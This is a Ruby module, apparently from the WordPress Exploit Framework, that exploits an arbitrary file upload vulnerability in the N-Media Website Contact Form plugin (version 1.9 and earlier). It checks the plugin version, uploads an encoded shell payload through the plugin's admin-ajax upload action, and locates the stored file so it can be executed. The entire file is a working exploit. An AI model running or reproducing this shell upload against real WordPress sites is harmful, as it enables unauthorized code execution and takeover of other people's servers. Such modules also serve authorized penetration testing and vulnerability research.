# frozen_string_literal: true

class Wpxf::Exploit::NMediaWebsiteContactFormV19ShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'N-Media Website Contact Form >= 1.9 Shell Upload',
      author: [
        'White Fir Design', # Vulnerability discovery
        'rastating'         # WPXF module
      ],
      references: [
        ['URL', 'https://www.pluginvulnerabilities.com/2016/09/19/arbitrary-file-upload-vulnerability-in-n-media-website-contact-form-with-file-upload/'],
        ['WPVDB', '8623']
      ],
      date: 'Sep 19 2016'
    )
  end

  def check
    check_plugin_version_from_readme('website-contact-form-with-file-upload', nil, '1.9')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('file', payload.encoded, payload_name)
    builder.add_field('name', payload_name)
    builder.add_field('action', 'nm_webcontact_upload_file')
    builder
  end

  def uploader_url
    wordpress_url_admin_ajax
  end

  def uploaded_payload_location
    stored_name = JSON.parse(upload_result.body)['file_name']
    return normalize_uri(wordpress_url_wp_content, 'uploads', 'contact_files', stored_name)
  rescue StandardError => e
    raise "Failed to parse response: #{e}"
  end
end
